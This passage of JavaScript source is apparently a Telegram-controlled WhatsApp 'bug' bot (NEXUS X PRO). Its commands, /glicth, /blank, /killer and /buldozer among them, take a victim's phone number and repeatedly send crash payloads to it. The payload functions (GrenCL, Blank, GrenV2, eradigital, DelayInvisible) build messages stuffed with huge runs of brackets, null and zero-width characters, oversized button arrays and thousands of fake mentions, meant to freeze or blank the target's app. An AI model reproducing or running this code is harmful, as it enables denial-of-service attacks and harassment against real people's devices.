            { text: "𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "/start", style: "Danger" },
        ]
    ];

    await ctx.editMessageMedia({
        type: "photo",
        media: THUMB,
        caption: caption,
        parse_mode: "HTML"
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
});

// ─────── TOOLS OWNER ─────── //
bot.action('/tools_menu', async (ctx) => {
    const caption = `「力」ではなく、「技術」で証明する。
Prσvє ít wíth tєchnσlσgy, nσt wíth pσwєr.
<blockquote>𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔</blockquote>
☇ /url → υrl αnαlyzєr
☇ /lookup → íp/dσmαín lσσkυp
☇ /hash → hαsh gєnєrαtσr
☇ /file → fílє αnαlyzєr
☇ /json → jsσn fσrmαttєr
☇ /base64 → єncσdє/dєcσdє fílє
☇ /timestamp → tímєstαmp cσnvєrtєr`;

    const keyboard = [
        [
            { text: "𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "/start", style: "Danger" },
        ]
    ];

    await ctx.editMessageMedia({
        type: "photo",
        media: THUMB,
        caption: caption,
        parse_mode: "HTML"
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
});

// ─────── CALLBACK OWNER ─────── //
bot.action('/owner_menu', async (ctx) => {
    const caption = `「力」ではなく、「技術」で証明する。
Prσvє ít wíth tєchnσlσgy, nσt wíth pσwєr.
<blockquote>𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔</blockquote>
☇ /connect → hυbυngkαn ѕєndєr
☇ /restart → dєlєtє ѕєndєr
☇ /addgroup → αdd αll mєmbєrѕ
☇ /disable → blσkír cσmmαnd
☇ /enable → bυkα cσmmαnd
☇ /adduser → αdd prєmíυm υѕєr
☇ /deluser → dєl prєmíυm υѕєr
☇ /setjeda → sєtjєdα cσmmαnd
☇ /backup → bαckυp fílє dαtαbαsє
☇ /restore → rєstσrє fílє dαtαbαsє
☇ /uptime → mєlíhαt υptímє bσt
☇ /setch → sєt chαnnєl jσín
☇ /delch → hαpυs chαnnєl jσín`;

    const keyboard = [
        [
            { text: "𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "/start", style: "Danger" },
        ]
    ];

    await ctx.editMessageMedia({
        type: "photo",
        media: THUMB,
        caption: caption,
        parse_mode: "HTML"
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
});

// ─────── BEBAS SPAM BUG ─────── //
bot.command("glicth", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 Fσrmαt: /glicth 62×××`);
    
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const cd = checkTargetCooldown(target);
    if (!cd.ok) {
        console.log(chalk.yellow(`⚠️ Tαrgєt cσσldσwn ${cd.sisa}s | ${q}`));
        
        return ctx.reply(`
⏳ <b>TΑRGЄT MΑSÍH CΟΟLDΟWN</b>

📱 Nσmєr : <code>${q}</code>
⏱️ Tυnggυ : <b>${cd.sisa} dєtík</b> lαgí

Cσbα lαgí sєtєlαh ${cd.sisa} dєtík yα dєk 😉
`, { parse_mode: "HTML" });
    }

    const processMessage = await ctx.reply(`\`\`\`js
⚔️ Delay Bebas Spam
 
Target No: ${q}
Status: Procecing 
Loop: 10/10
Node: ACTIVE
\`\`\``, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 10; i++) {
        await safeSend(sock, target, async () => {
            await DelayInvisible(sock, target);
        }, "glicth");
    }

    setTargetCooldown(target);
    console.log(chalk.yellow(`⏳ Tαrgєt ${q} mαsυk cσσldσwn 40s`));

    await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `\`\`\`js
⚔️ Dєlαч Bєвαs Spαm
 
Target No: ${q}
Status: Selesai 
Loop: 10/10
Node: ACTIVE
\`\`\``, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });
});

bot.command("ints", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 Fσrmαt: /ints 62×××`);
    
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const cd = checkTargetCooldown(target);
    if (!cd.ok) {
        console.log(chalk.yellow(`⚠️ Tαrgєt cσσldσwn ${cd.sisa}s | ${q}`));
        
        return ctx.reply(`
⏳ <b>TΑRGЄT MΑSÍH CΟΟLDΟWN</b>

📱 Nσmєr : <code>${q}</code>
⏱️ Tυnggυ : <b>${cd.sisa} dєtík</b> lαgí

Cσbα lαgí sєtєlαh ${cd.sisa} dєtík yα dєk 😉
`, { parse_mode: "HTML" });
    }

    const processMessage = await ctx.reply(`\`\`\`js
⚔️ Delay X Frezee Bebas Spam
 
Target No: ${q}
Status: Procecing 
Loop: 10/10
Node: ACTIVE
\`\`\``, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 10; i++) {
        await safeSend(sock, target, async () => {
            await eradigital(sock, target);
        }, "ints");
    }

    setTargetCooldown(target);
    console.log(chalk.yellow(`⏳ Tαrgєt ${q} mαsυk cσσldσwn 40s`));

    await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `\`\`\`js
⚔️ Delay X Frezee Bebas Spam
 
Target No: ${q}
Status: Selesai 
Loop: 10/10
Node: ACTIVE
\`\`\``, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });
});

bot.command("clutch", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 Fσrmαt: /clutch 62×××`);
    
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const cd = checkTargetCooldown(target);
    if (!cd.ok) {
        console.log(chalk.yellow(`⚠️ Tαrgєt cσσldσwn ${cd.sisa}s | ${q}`));
        
        return ctx.reply(`
⏳ <b>TΑRGЄT MΑSÍH CΟΟLDΟWN</b>

📱 Nσmєr : <code>${q}</code>
⏱️ Tυnggυ : <b>${cd.sisa} dєtík</b> lαgí

Cσbα lαgí sєtєlαh ${cd.sisa} dєtík yα dєk 😉
`, { parse_mode: "HTML" });
    }

    const processMessage = await ctx.reply(`\`\`\`js
⚔️ Delay Bebas Spam v2
 
Target No: ${q}
Status: Procecing 
Loop: 10/10
Node: ACTIVE
\`\`\``, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 10; i++) {
        await safeSend(sock, target, async () => {
            await DelayInvisible(sock, target);
        }, "clutch");
    }

    setTargetCooldown(target);
    console.log(chalk.yellow(`⏳ Tαrgєt ${q} mαsυk cσσldσwn 40s`));

    await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `\`\`\`js
⚔️ Dєlαч Bєвαs Spαm v2
 
Target No: ${q}
Status: Selesai 
Loop: 10/10
Node: ACTIVE
\`\`\``, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });
});

bot.command("croyan", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 Fσrmαt: /croyan 62×××`);
    
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const cd = checkTargetCooldown(target);
    if (!cd.ok) {
        console.log(chalk.yellow(`⚠️ Tαrgєt cσσldσwn ${cd.sisa}s | ${q}`));
        
        return ctx.reply(`
⏳ <b>TΑRGЄT MΑSÍH CΟΟLDΟWN</b>

📱 Nσmєr : <code>${q}</code>
⏱️ Tυnggυ : <b>${cd.sisa} dєtík</b> lαgí

Cσbα lαgí sєtєlαh ${cd.sisa} dєtík yα dєk 😉
`, { parse_mode: "HTML" });
    }

    const processMessage = await ctx.reply(`\`\`\`js
⚔️ Delay For Murbug
 
Target No: ${q}
Status: Procecing 
Loop: 10/10
Node: ACTIVE
\`\`\``, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 10; i++) {
        await safeSend(sock, target, async () => {
            await DelayInvisible(sock, target);
        }, "croyan");
    }

    setTargetCooldown(target);
    console.log(chalk.yellow(`⏳ Tαrgєt ${q} mαsυk cσσldσwn 40s`));

    await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `\`\`\`js
⚔️ Delay For Murbug
 
Target No: ${q}
Status: Selesai 
Loop: 10/10
Node: ACTIVE
\`\`\``, {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });
});

// ─────── NO SPAM BUG ─────── //
bot.command("blank", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 Fσrmαt: /blank 62×××`);
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Blαnk X Frєzєє Vísíвlє
↯ Nυmвєr: ${q}
↯ Stαtυs: Mєngírím...
`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 45; i++) {
      await GrenV2(sock, target);
      await sleep(1800);
    }
    
    await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Blαnk X Frєzєє Vísíвlє
↯ Nυmвєr: ${q}
↯ Stαtυs: Sєlєsαí`, {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });
});

bot.command("hold", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 Fσrmαt: /hold 62×××`);
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Dєlαч X Frєzєє Ínvísíвlє
↯ Nυmвєr: ${q}
↯ Stαtυs: Mєngírím...
`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 55; i++) {
      await eradigital(sock, target);
      await DelayInvisible(sock, target);
      await sleep(1800);
    }
    
    await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Dєlαч X Frєzєє Ínvísíвlє
↯ Nυmвєr: ${q}
↯ Stαtυs: Sєlєsαí`, {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });
});

bot.command("killer", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 Fσrmαt: /killer 62×××`);
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Blαnk Αndrσíd Vísíвlє
↯ Nυmвєr: ${q}
↯ Stαtυs: Mєngírím...
`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 45; i++) {
      await Blank(sock, target);
      await DelayInvisible(sock, target);
      await sleep(1800);
    }
    
    await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Blαnk Αndrσíd Vísíвlє
↯ Nυmвєr: ${q}
↯ Stαtυs: Sєlєsαí`, {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });
});

bot.command("buldozer", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 Fσrmαt: /buldozer 62×××`);
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Bυldσzєr kυσtα Ínvísíвlє
↯ Nυmвєr: ${q}
↯ Stαtυs: Mєngírím...
`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 45; i++) {
      await GrenCL(sock, target);
      await DelayInvisible(sock, target);
      await sleep(1800);
    }
    
    await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Bυldσzєr kυσtα Ínvísíвlє
↯ Nυmвєr: ${q}
↯ Stαtυs: Sєlєsαí`, {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });
});

bot.command("combox", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 Fσrmαt: /combox 62×××`);
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Blαnk X Dєlαч Αndrσíd
↯ Nυmвєr: ${q}
↯ Stαtυs: Mєngírím...
`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 45; i++) {
      await Blank(sock, target);
      await DelayInvisible(sock, target);
      await sleep(1800);
    }
    
    await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Blαnk X Dєlαч Αndrσíd
↯ Nυmвєr: ${q}
↯ Stαtυs: Sєlєsαí`, {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
            ]]
        }
    });
});

// ─────── EXTRACT GROUP CODE ─────── //
function extractGroupCode(input) {
    const text = String(input || "").trim();
    const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/i);
    return match ? match[1] : null;
}

// ─────── AWAL DARI FUNCTION ─────── //
async function GrenCL(sock, target) {
  const jid = String(target).includes("@")
    ? String(target)
    : String(target).replace(/\D/g, "") + "@s.whatsapp.net";

  let X = "\u0000".repeat(2000);
  let B = "uuid, data".repeat(50000);

  const Gren = {
    richResponseMessage: {
      messageType: 1,
      submessages: [{
        messageType: 9,
        contentItemsMetadata: {
          contentType: 1,
          itemsMetadata: [{
            reelItem: {
              videoUrl: "https://files.catbox.moe/h1xx7k.mp4" + B,
              thumbnailUrl: "https://files.catbox.moe/h1xx7k.mp4" + X,
              profileIconUrl: "https://files.catbox.moe/h1xx7k.mp4" + B
            }
          }]
        }
      }]
    }
  };

  await sock.relayMessage('status@broadcast', Gren, {
    messageId: 'gren-' + Date.now().toString(36).toUpperCase(),
    statusJidList: [jid],
    noSelfSync: true,
    additionalNodes: [{
      tag: 'meta',
      attrs: {},
      content: [{
        tag: 'mentioned_users',
        attrs: {},
        content: [{ tag: 'to', attrs: { jid: jid }, content: [] }]
      }]
    }]
  });
}

async function Blank(sock, target) {
    const jid = target.includes("@") ? target : target + "@s.whatsapp.net";

    const msg = await generateWAMessageFromContent(jid, {
        buttonsMessage: {
            contentText: "270 subs",
            footerText: "ꦾDɪᴋs Is Hᴀʀᴇ",
            headerType: 1,
            buttons: [
                {
                    buttonId: "ꦾɢʜᴏꜱᴛ1",
                    buttonText: {
                        displayText: "u200D".repeat(7000) + "ြ".repeat(5500)+"\uFE0F".repeat(6000),
                    },
                    type: 1
                },
                {
                    buttonId: "ꦾɢʜᴏꜱᴛ2",
                    buttonText: {
                        displayText: "\u200B".repeat(9000) + "\uFE00".repeat(6000)+"ꦾ".repeat(5000),
                    },
                    type: 1
                }
            ]
        }
    }, { userJid: jid });

    await sock.relayMessage(jid, msg.message, {
        messageId: msg.key.id,
     noSelfSync: true
    });
}

async function GrenV2(sock, target) {
  var Gren = {
    interactiveMessage: {
      body: {
        format: "DEFAULT",
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 5000 }, () => ({
          buttons: Array.from({ length: 0 }, () => ({})),
          buttons: Array.from({ length: 0 }, () => ({})),
          buttons: Array.from({ length: 0 }, () => ({})),
          name: "voice_call",
          buttonParamsJson: "\0"
        }))
      }
    }
  };

  await sock.relayMessage(target, Gren, { noSelfSync: true });
}

async function eradigital(sock, target) {
  const xx = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: " hihi " },
          nativeFlowMessage: {
            buttons: "{".repeat(500000),
          },
        },
      },
    },
  };

  const x = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "hii" },
          nativeFlowMessage: {
            buttons: "{}".repeat(500000),
          },
        },
      },
    },
  };

  try {
    const msg1 = generateWAMessageFromContent(target, xx, {});
    await sock.relayMessage(target, msg1.message, { messageId: msg1.key.id, noSelfSync: true });

    await new Promise((resolve) => setTimeout(resolve, 500));

    const msg2 = generateWAMessageFromContent(target, x, {});
    await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id, noSelfSync: true });
  } catch (error) {
    console.error("Error to sending your bug:", error);
  }
}

async function DelayInvisible(sock, target) {
  const msg = {
    key: {
      richResponseMessage: {},
      remoteJid: "628xxxx@s.whatsapp.net",
      fromMe: true,
      id: "ABC123XYZ",
      extra1: "\u0000".repeat(555)
    },
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "DiksCrash",
            display_text: "x9234"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({})),
            buttons: Array.from({ length: 500000 }, () => ({})),
            buttons: Array.from({ length: 500000 }, () => ({})),
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1999 }, () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
                ...Array.from({ length: 1999 }, () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                )
              ]
            },
            messageAIRichResponseCodeMetadata: {
              codeLanguage: "rusia",
              codeBlocks: [
                {
                  highlightType: 0,
                  codeContent: "uhz"
                }
              ],
              enumAIRichResponseCodeHighlightType: {
                AI_RICH_RESPONSE_CODE_HIGHLIGHT_DEFAULT: 0,
                AI_RICH_RESPONSE_CODE_HIGHLIGHT_KEYWORD: 1,
                AI_RICH_RESPONSE_CODE_HIGHLIGHT_METHOD: 2,
                AI_RICH_RESPONSE_CODE_HIGHLIGHT_STRING: 3,
                AI_RICH_RESPONSE_CODE_HIGHLIGHT_NUMBER: 4,
                AI_RICH_RESPONSE_CODE_HIGHLIGHT_COMMENT: 5
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, { noSelfSync: true });
  console.log("✅ SUCCESS SEND BUGS");
}

// ─────── AKHIR DARI FUNCTION ─────── //
(async () => {
    const result = await L2_validate();

    if (!result.ok) {
        console.log('');
        console.log('\x1b[31m\x1b[1m  ✗ TOKEN TIDAK TERDAFTAR\x1b[0m');
        console.log('');
        console.log('\x1b[37m  Alasan : \x1b[31m' + result.error + '\x1b[0m');
        console.log('');
        console.log('\x1b[33m\x1b[1m  Mau ngapain dek? 🤨\x1b[0m');
        console.log('');
        console.log('\x1b[90m  Token lu ga ada di database owner.\x1b[0m');
        console.log('\x1b[90m  Jangan coba-coba bypass ya dek\x1b[0m');
        console.log('');
        process.exit(1);
    }

    bot.launch().catch((err) => {
        console.log('');
        console.log('\x1b[31m\x1b[1m  ✗ GAGAL LAUNCH: \x1b[37m' + err.message + '\x1b[0m');
        console.log('');
        process.exit(1);
    });

    setTimeout(() => {
        console.log('');
        console.log('\x1b[32m\x1b[1m  ✓ TOKEN TERDAFTAR\x1b[0m');
        console.log('');
        console.log('\x1b[36m  Bot ID  : \x1b[37m' + result.botId + '\x1b[0m');
        console.log('\x1b[36m  Status  : \x1b[32mOnline\x1b[0m');
        console.log('\x1b[36m  Layer   : \x1b[37m1 ✓  2 ✓\x1b[0m');
        console.log('');
        console.log('\x1b[33m  Bot siap menerima pesan...\x1b[0m');
        console.log('');
    }, 1500);
})();